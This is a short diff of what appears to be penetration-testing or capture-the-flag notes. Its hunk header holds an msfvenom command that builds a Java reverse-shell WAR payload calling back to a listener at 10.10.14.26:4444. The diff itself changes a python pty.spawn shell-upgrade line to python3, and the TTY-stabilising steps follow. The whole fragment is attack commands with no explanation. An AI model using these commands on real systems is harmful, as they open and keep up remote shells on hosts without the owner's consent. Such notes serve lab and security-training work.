@@ -14,7 +14,7 @@ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war > reverse
 
 
 
-python -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
 export TERM=xterm
 ctrl+z
 stty raw -echo && fg
